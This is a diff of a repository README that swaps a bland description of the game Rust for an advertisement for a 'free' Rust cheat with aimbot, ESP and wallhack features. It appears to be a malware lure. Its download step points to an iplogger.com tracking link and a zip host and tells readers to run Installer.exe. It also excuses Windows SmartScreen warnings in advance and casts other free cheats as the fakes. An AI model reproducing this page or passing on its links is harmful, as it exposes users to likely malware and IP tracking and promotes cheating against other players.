@@ -3,29 +3,159 @@
 [<img src="https://i.imgur.com/qnUEtjN.jpg"/>](https://app.box.com/shared/static/lrq3wnlwwu6vtat81fdt0e94pm7oguvx.zip)
 
 
-## Prelude
-Welcome to Rust, a sprawling and immersive multiplayer survival odyssey that immerses you in a meticulously designed post-apocalyptic realm. In this vast open-world sandbox, where every sunrise brings both promise and peril, you are thrust into a relentless struggle for survival, forging alliances, facing adversaries, and navigating a world that is as beautiful as it is unforgiving.
+Red free Rust cheat External, also known as Soft Aim, is a popular hack among Rust players. While it usually requires payment, a recent disagreement between its creators has resulted in the source code being made publicly available.
 
-## Genesis of Chaos
-Rust's narrative unfolds in the aftermath of a cataclysm, where the remnants of civilization cling to existence amidst the ruins. This persistent and dynamic multiplayer universe beckons players to not only weather environmental challenges but also to navigate the intricate tapestry of player interactions, forging a legacy shaped by alliances, betrayals, and the indomitable will to endure.
+## <a id="disclaimer"></a>⚠️ 〢 WARNING
 
-## Landscape of Desolation
-Behold a world sculpted by the hands of time and chaos. Towering mesas cast shadows over arid deserts, dense biomes hide both treasures and threats, and expansive plains echo with the howls of distant predators. Traverse a living canvas where the elements, wildlife, and rival players collectively dictate the rhythm of survival.
+Almost all of the "free cheats" you see on GitHub are fake! Most of them are malware (viruses/ransomware) infecting your PC - do not download anything that requires you to enter a password!
 
-## Symphony of Player Agency
-Rust is not merely a game; it's a symphony of player-driven agency. Engage in diplomatic overtures, establish trade empires, or clash in epic player-versus-player (PvP) battles that echo through the ages. The game's dynamic player-driven economy and ever-evolving political landscape ensure that every decision contributes to the epic saga of Rust.
+## <a id="disclaimer"></a>⚠️ 〢 WARNING 2
 
-## Bastions of Grandeur
-Build not just structures but legacies. Rust's intricate building system empowers players to create bastions of grandeur, from modest homesteads to sprawling metropolises. Plan strategically, fortify diligently, and shape the very landscapes you traverse, asserting dominance in a world where only the resilient prevail.
+Some users may experience a SmartScreen when first opening it, especially on Windows 11. We are working on a solution to this problem.
 
-## Crafting Odyssey Unveiled
-Embark on a crafting odyssey as you gather resources, unlock blueprints, and sculpt your arsenal of tools, weapons, and gear. Rust's nuanced progression system rewards mastery, enabling players to unlock cutting-edge technologies and equipment, ensuring supremacy in a dynamic and ever-shifting environment.
+## <a id="disclaimer"></a>⚠️ 〢 DISCLAIMER
 
-## Realism Woven into Survival
-Survival is not just a challenge; it's an art form in Rust. Manage hunger, quench your thirst, and tend to your health in a meticulously crafted system that mirrors the unforgiving reality of a post-apocalyptic world. Adapt or succumb – the crucible of survival awaits.
+This project was made for educational purposes and personal use. You hold responsibility, liability and accountability for any consequences caused by your actions.
 
-## Living Tapestry of Development
-Rust is a living tapestry, woven by the hands of the community. A dedicated development team ensures a dynamic and ever-evolving gaming experience, with regular updates introducing new features, optimizations, and content. Engage in a community-driven development process that propels Rust to the forefront of innovation.
+## 🌐 〢 EPIC GUIDE
 
-## Epilogue of the Enduring
-Embark on an epic odyssey of survival, strategy, and social dynamics in Rust. Will you be a lone wolf, a diplomatic luminary, or the orchestrator of a formidable empire? The choices are yours in this expansive, ever-evolving, player-driven world. Navigate the trials, adapt to the challenges, and carve out your legacy amidst the chaotic beauty that is Rust – the epoch of endurance.
+- [💙・Features](#features)
+- [💚・Screenshots](#screenshots)
+- [💛・Download](#download)
+- [❤️・Install](#install)
+- [💗・Changelogs](#changelogs)
+
+
+## <a id="features"></a>💙 〢 Features
+---
+
+```
+1. Rust Aimbot
+
+Aimbot is a software tool used in first-person shooters. It allows the player to shoot enemies without aiming the weapon. It has a very strong point, as it helps the player shoot with much more accuracy and less skill.
+
+2. Rust ESP
+
+ESP displays information about players above their heads. This can be the player's health, name or the current weapon being used.
+
+3. Rust WallHack
+
+WallHack is a feature that grants true x-ray vision, after which all players within a location are visible as if in the palm of your hand.
+
+4. Rust TriggerBot
+
+TriggerBot or autofire is a feature that allows your weapon to automatically fire a shot when pointed at an opponent.
+
+5. Rust SpinBot
+
+Spinbot is a feature that is used in conjunction with the aimbot, it prevents the enemy from hitting you through very fast spinning.
+
+6. Rust FOV Changer
+
+FOV Changer is a feature that changes your field of view (FOV) depending on the situation.
+
+7. Rust Skin Swapper
+
+Skin Swapper is a feature that adds a skin selection window to your game while playing. You will be able to choose any skin you want or even add your own skin
+
+8. As well as more than 30 more features for comfortable game play
+
+```
+---
+
+
+
+## <a id="screenshots"></a>💚 〢 Screenshots
+
+![Screenshot 1](https://i.imgur.com/2s3iKdo.jpg)
+![Screenshot 2](https://i.imgur.com/LkYydJJ.jpg)
+![Screenshot 3](https://i.imgur.com/3iVz7ca.jpg)
+![Screenshot 4](https://i.imgur.com/nA0Jl5K.jpg)
+
+
+## <a id="download"></a>💛 〢 Download
+
+1. Download the installation file from [click to download](https://iplogger.com/gitdownloader).
+2. Run the installation and follow the on-screen instructions.
+
+## <a id="install"></a>❤️ 〢 Install
+
+1. Download, unzip the archive;
+2. Run Installer.exe;
+3. Wait for the installation to finish;
+4. Select Rust;
+5. Start the game;
+6. Done!
+
+## <a id="changelogs"></a>💗 〢 Changelogs
+
+If you find these changelogs on any other "free cheat" it's fake. They copied ours.
+
+```diff
+vUnknown - Final | 02/12/2023
++ Last renewal
++ Unlocked all features
+- Once it gets patched, we will no longer update it
+
+v2.0 | 20/09/2023
++ Improved compability
++ Added many new features
+- Bugfixes
+
+v1.6 | 28/05/2023
+- Bugfixes
+
+v1.5 | 26/01/2023
+- Bugfixes
+
+v1.4 | 08/01/2023
++ New drivers
++ New aimbot technology
+- (It's a bit laggy, we're on it)
+- Bugfixes
+
+v1.3 | 02/01/2023
++ Renewed UI
+- Removed functions
+- Bugfixes
+
+v1.2.2 | 05/12/2022
++ Fixed invalid links
++ Updated header
++ Code improvements
+- Bugfixes
+
+v1.2 | 16/11/2022
++ Added Spinbot
++ Added Spinbot speed
++ Added Import / Export .json settings
++ Added Manual inject button
+- Fixed a bug where saving would take up to 15 minutes instead of 2
+
+v1.1 | 01/11/2022
++ Aimbot FOV Circle 
++ Aimbot FOV Circle Size
++ Adjustable Aimbot Smoothness 
++ More Aimbot Triggerkeys
++ Glow ESP
++ Glow Intensity 
++ Auto-Lock Agent
++ UI Updates
+- Fixed a bug where Tracers didn't show properly
+- Fixed a bug where valid TIDs were flagged as invalid 
+
+v1.0 | 30/10/2022
++ Stable Build Release
+```
+
+---
+
+<p>
+If you like this project and want to support me and future updates, leave a star</a> 🌟
+<br>
+<br>
+<a href="#top">
+Back to the top
+</a>
+</p>
+</div>
